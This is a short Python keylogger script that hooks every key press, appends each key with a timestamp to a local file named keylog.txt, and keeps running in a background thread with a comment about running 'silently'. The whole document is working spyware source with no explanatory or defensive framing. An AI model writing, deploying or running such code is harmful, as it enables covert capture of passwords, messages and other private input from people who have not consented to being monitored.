import keyboard
import threading
import time
from datetime import datetime

log_file = "keylog.txt"

def write_log(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] {str(key).replace("'", "")}\n")

def start_logging():
    keyboard.on_press(lambda e: write_log(e.name))
    keyboard.wait()

print("[+] Keylogger started - running in background...")
thread = threading.Thread(target=start_logging, daemon=True)
thread.start()

# Keeps the script running silently
while True:
    time.sleep(100)